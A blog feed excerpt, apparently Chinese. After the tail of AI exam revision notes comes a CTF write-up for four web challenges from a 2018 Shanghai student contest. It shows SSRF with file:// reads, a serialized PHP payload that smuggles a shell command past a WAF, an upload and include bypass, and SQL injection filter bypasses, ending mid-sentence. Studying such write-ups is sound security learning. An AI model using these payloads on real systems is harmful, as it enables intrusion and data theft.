src="/images/2018-11-14-11-18-46.png" alt=""></p><h4 id="例题7"><a href="#例题7" class="headerlink" title="例题7"></a>例题7</h4><p><img src="/images/2018-11-14-11-19-04.png" alt=""><br><img src="/images/2018-11-14-11-19-15.png" alt=""></p><h4 id="例题8"><a href="#例题8" class="headerlink" title="例题8"></a>例题8</h4><p><img src="/images/2018-11-14-11-19-35.png" alt=""><br><img src="/images/2018-11-14-11-19-43.png" alt=""></p><h3 id="产生式系统的组成部分"><a href="#产生式系统的组成部分" class="headerlink" title="产生式系统的组成部分"></a>产生式系统的组成部分</h3><p><img src="/images/2018-11-12-11-30-31.png" alt=""></p><h3 id="规则库样例"><a href="#规则库样例" class="headerlink" title="规则库样例"></a>规则库样例</h3><p>R1~R8:基本规则：判断动物类型<br>R9~R15:递进规则：识别出动物<br><img src="/images/2018-11-12-11-31-24.png" alt=""><br><img src="/images/2018-11-12-11-31-35.png" alt=""><br><img src="/images/2018-11-12-11-34-04.png" alt=""></p><h3 id="框架表示法"><a href="#框架表示法" class="headerlink" title="框架表示法"></a>框架表示法</h3><p><img src="/images/2018-11-14-11-23-07.png" alt=""><br><img src="/images/2018-11-14-11-24-10.png" alt=""></p><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="搜索策略评价标准"><a href="#搜索策略评价标准" class="headerlink" title="搜索策略评价标准"></a>搜索策略评价标准</h3><p><img src="/images/2018-11-19-09-35-46.png" alt=""></p><h3 id="状态空间搜索"><a href="#状态空间搜索" class="headerlink" title="状态空间搜索"></a>状态空间搜索</h3><h4 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h4><p><img src="/images/2018-11-13-12-59-46.png" alt=""></p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p><img src="/images/2018-11-13-12-58-18.png" alt=""><br><img src="/images/2018-11-13-12-58-36.png" alt=""></p><h3 id="盲注搜索（宽度优先搜索-BFS）"><a href="#盲注搜索（宽度优先搜索-BFS）" class="headerlink" title="盲注搜索（宽度优先搜索 BFS）"></a>盲注搜索（宽度优先搜索 BFS）</h3><h4 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h4><p><img src="/images/2018-11-13-12-54-40.png" alt=""><br>依次展开，宽度优先</p><h4 id="算法优缺点"><a href="#算法优缺点" class="headerlink" title="算法优缺点"></a>算法优缺点</h4><p><img src="/images/2018-11-13-12-55-20.png" alt=""><br><img src="/images/2018-11-13-12-55-39.png" alt=""></p><h3 id="盲注搜索（深度优先搜索-DFS）"><a href="#盲注搜索（深度优先搜索-DFS）" class="headerlink" title="盲注搜索（深度优先搜索 DFS）"></a>盲注搜索（深度优先搜索 DFS）</h3><h4 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h4><p><img src="/images/2018-11-13-12-56-21.png" alt=""><br>疯狂往下（注意深度限制），触底反弹</p><h4 id="算法优缺点-1"><a href="#算法优缺点-1" class="headerlink" title="算法优缺点"></a>算法优缺点</h4><p><img src="/images/2018-11-13-12-56-51.png" alt=""><br><img src="/images/2018-11-13-12-57-01.png" alt=""></p><h3 id="启发式搜索"><a href="#启发式搜索" class="headerlink" title="启发式搜索"></a>启发式搜索</h3><p>考虑错位因素和深度</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p><img src="/images/2018-11-19-09-13-50.png" alt=""><br><img src="/images/2018-11-19-09-14-22.png" alt=""><br><img src="/images/2018-11-19-09-14-08.png" alt=""></p><h3 id="启发式搜索改进版A-算法"><a href="#启发式搜索改进版A-算法" class="headerlink" title="启发式搜索改进版A*算法"></a>启发式搜索改进版A*算法</h3><p>在启发式搜索的基础上，加入错位距离，不仅仅考虑错位因素</p><h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><p><img src="/images/2018-11-19-09-15-04.png" alt=""><br><img src="/images/2018-11-19-09-15-26.png" alt=""></p><h3 id="问题规约"><a href="#问题规约" class="headerlink" title="问题规约"></a>问题规约</h3><h4 id="AND-OR图"><a href="#AND-OR图" class="headerlink" title="AND-OR图"></a>AND-OR图</h4><p><img src="/images/2018-11-19-09-19-36.png" alt=""></p><h4 id="算法AO和A的比较"><a href="#算法AO和A的比较" class="headerlink" title="算法AO和A的比较"></a>算法AO<em>和A</em>的比较</h4><p><img src="/images/2018-11-19-09-24-42.png" alt=""></p><h3 id="博弈"><a href="#博弈" class="headerlink" title="博弈"></a>博弈</h3><p><img src="/images/2018-11-19-09-29-18.png" alt=""></p><h4 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h4><p><img src="/images/2018-11-19-09-28-50.png" alt=""><br><img src="/images/2018-11-19-09-29-02.png" alt=""></p><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><h3 id="自然演绎推理"><a href="#自然演绎推理" class="headerlink" title="自然演绎推理"></a>自然演绎推理</h3><h4 id="例题1-2"><a href="#例题1-2" class="headerlink" title="例题1"></a>例题1</h4><p><img src="/images/2018-11-13-13-03-54.png" alt=""><br><img src="/images/2018-11-13-13-04-21.png" alt=""></p><h3 id="归结演绎推理"><a href="#归结演绎推理" class="headerlink" title="归结演绎推理"></a>归结演绎推理</h3><h4 id="子句化简"><a href="#子句化简" class="headerlink" title="子句化简"></a>子句化简</h4><p><img src="/images/2018-11-13-13-13-20.png" alt=""><br><img src="/images/2018-11-13-13-14-47.png" alt=""><br><img src="/images/2018-11-13-13-16-22.png" alt=""><br><img src="/images/2018-11-13-13-17-21.png" alt=""><br><img src="/images/2018-11-13-13-18-34.png" alt=""><br><img src="/images/2018-11-13-13-19-20.png" alt=""><br><img src="/images/2018-11-13-13-21-02.png" alt=""></p><h4 id="例题1-3"><a href="#例题1-3" class="headerlink" title="例题1"></a>例题1</h4><p><img src="/images/2018-11-13-13-23-46.png" alt=""><br>解：<br><img src="/images/2018-11-13-13-23-53.png" alt=""><br><img src="/images/2018-11-13-13-24-27.png" alt=""><br><img src="/images/2018-11-13-13-24-33.png" alt=""><br><img src="/images/2018-11-13-13-24-42.png" alt=""><br>结果：<br><img src="/images/2018-11-13-13-24-48.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;纯为了考试复习而生的文章&lt;br&gt;考试内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单选20%&lt;/li&gt;
&lt;li&gt;判断10%&lt;/li&gt;
&lt;li&gt;简答20%
      
    
    </summary>
    
      <category term="study" scheme="http://skysec.top/categories/study/"/>
    
    
      <category term="study" scheme="http://skysec.top/tags/study/"/>
    
  </entry>
  
  <entry>
    <title>2018上海大学生信息安全竞赛-web</title>
    <link href="http://skysec.top/2018/11/04/2018%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-web/"/>
    <id>http://skysec.top/2018/11/04/2018上海大学生信息安全竞赛-web/</id>
    <published>2018-11-04T02:18:18.000Z</published>
    <updated>2018-11-05T02:59:53.203Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知： https://xz.aliyun.com/t/3150</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正值周末，有幸ak了这个比赛的web，正好去年也打过一次，附上去年的题解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2017/11/05/%E4%B8%8A%E6%B5%B7%E7%BA%BF%E4%B8%8A%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/</span><br></pre></td></tr></table></figure></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>拿到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://745fca0a178a41589917dd014537bd862c411015831d4eeb.game.ichunqiu.com/</span><br></pre></td></tr></table></figure></p><p>提示我们访问robots.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">what are you doing?&lt;br /&gt; &lt;!--  you need to visit to robots.txt  --&gt;</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source.php</span><br><span class="line">flag.php</span><br></pre></td></tr></table></figure></p><p>于是去访问source.php<br><img src="/images/2018-11-04-10-21-38.png" alt=""><br>按一系列要求改http头<br><img src="/images/2018-11-04-10-22-48.png" alt=""><br>发现这里有一个下载链接，想到可能是用来放url请求的信息的，于是简单构造了一些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://@127.0.0.1:80@www.ichunqiu.com/.//index.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-04-10-24-17.png" alt=""><br>发现得到主页内容，说明的确是用来存放url请求内容的<br>那么想到file协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin=1&amp;url=file://@127.0.0.1:80@www.ichunqiu.com/.//../../var/www/html/flag.php</span><br></pre></td></tr></table></figure></p><p>具体原理看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-04-10-18-44.png" alt=""><br>于是得到flag<br>然后顺手带走题目源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you need to login as admin!"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!-- post param  'admin' --&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'admin'</span>]==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_X_CLIENT_IP'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; parse_url($_POST[<span class="string">'url'</span>])[<span class="string">'host'</span>]==<span class="string">'www.ichunqiu.com'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                $curl = curl_init();</span><br><span class="line">                curl_setopt($curl, CURLOPT_URL, $_POST[<span class="string">'url'</span>]);</span><br><span class="line">                curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">                $content = curl_exec($curl);</span><br><span class="line">                curl_close($curl);</span><br><span class="line">                $filename=<span class="string">'download/'</span>.rand().<span class="string">';img1.jpg'</span>;</span><br><span class="line">                file_put_contents($filename,$content);</span><br><span class="line">                <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>];</span><br><span class="line">                $img=<span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>;</span><br><span class="line">                <span class="keyword">echo</span> $img;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you need post url: http://www.ichunqiu.com"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"only 127.0.0.1 can get the flag!!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$_POST[<span class="string">'admin'</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现果然是<code>libcurl</code>and<code>parse_url()</code>解析顺序的问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; parse_url($_POST[<span class="string">'url'</span>])[<span class="string">'host'</span>]==<span class="string">'www.ichunqiu.com'</span>)</span><br></pre></td></tr></table></figure></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>扫描目录得到源码泄露<code>.index.php.swp</code><br>恢复源码得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;<span class="keyword">and</span> to <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"echo $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"echo"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">'hi'</span>;</span><br><span class="line">$var=<span class="string">'var'</span>;</span><br><span class="line">$bbb=<span class="string">'bbb'</span>;</span><br><span class="line">$ccc=<span class="string">'ccc'</span>;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">"doller"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($var===<span class="string">"give"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($bbb===<span class="string">"me"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($ccc===<span class="string">"flag"</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;welcome!&lt;br&gt;"</span>;</span><br><span class="line">                $come=@$_POST[<span class="string">'come'</span>];</span><br><span class="line">                unserialize($come);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span class="string">"&lt;br&gt;think about it&lt;br&gt;"</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NO"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Can you hack me?&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现关键waf<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思考到可以使用双写绕过flag，用<code>$IFS</code>绕过空格<br>所以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat$IFS/flflagag`</span><br></pre></td></tr></table></figure></p><p>那么可以容易得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">come=O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A18%3A%22%60cat%24IFS%2Fflflagag%60%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-04-11-10-32.png" alt=""></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>题目给了代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//error_reporting(0);</span></span><br><span class="line">    <span class="comment">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span></span><br><span class="line">    $dir=md5(<span class="string">"icq"</span>);</span><br><span class="line">    $sandbox = <span class="string">'/var/sandbox/'</span> . $dir;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">        $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"emmmm..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">        $_ = $_POST[<span class="string">'hehe'</span>];</span><br><span class="line">        <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span> &amp;&amp; strpos($_,$new_name)===<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>实际上就是pwnhub公开赛的题魔改的，后面拼上了橘子哥的one line php<br>首先是前面的上传校验<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">       $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">       <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">           $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">       &#125;</span><br><span class="line">       $ext = end($filename);</span><br><span class="line">       <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"emmmm..."</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p><p>漏洞很明显，只判断了不是数组的时候，没判断是数组的时候，于是有了数组绕过<br>然后到后面的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">       move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">       $_ = $_POST[<span class="string">'hehe'</span>];</span><br><span class="line">       <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span> &amp;&amp; strpos($_,$new_name)===<span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">include</span>($_);</span><br><span class="line">       &#125;</span><br><span class="line">       unlink($new_name);</span><br></pre></td></tr></table></figure></p><p>unlink的问题非常明显，<code>/.</code>的后缀就可以绕过<br>于是有了以下方式<br><img src="/images/2018-11-04-13-06-29.png" alt=""><br>发现成功上传（本地测试了一下）<br><img src="/images/2018-11-04-13-06-14.png" alt=""><br>然后进行目录爆破，反正就100~999，即可包含成功文件名，从而获得flag</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>拿到题目后看到2个功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.管理员登录</span><br><span class="line">2.select guest</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-04-16-41-05.png" alt=""><br>于是先从select guest入手，进行注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://959094d5f7934f3fa1a334ab1dc50c4b6160be6cc2bb4d77.game.ichunqiu.com/select_guest.php?id=1%27 or 1%23</span><br></pre></td></tr></table></figure></p><p>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content=str_replace($value,&quot;&quot;,$content)2</span><br><span class="line">192.168.10.1</span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://959094d5f7934f3fa1a334ab1dc50c4b6160be6cc2bb4d77.game.ichunqiu.com/select_guest.php?id=1%27%20or%200%23</span><br></pre></td></tr></table></figure></p><p>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content=str_replace($value,&quot;&quot;,$content)1</span><br><span class="line">10.10.1.1</span><br></pre></td></tr></table></figure></p><p>于是开始写探测过滤,发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union</span><br><span class="line">information_schema.TABLES</span><br><span class="line">information_schema.COLUMNS</span><br></pre></td></tr></table></figure></p><p>均被过滤，那么尝试用bool盲注<br>而对于另外两个关键词，可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema . TABLES</span><br><span class="line">information_schema . COLUMNS</span><br></pre></td></tr></table></figure></p><p>进行bypass<br>随机注入得到管理员密码<code>adminpassword</code><br>登入后发现是一个上传页面：<br>如果上传.php会提示<br><img src="/images/2018-11-04-16-45-19.png" alt=""><br>如果上传别的，会提示<br><img 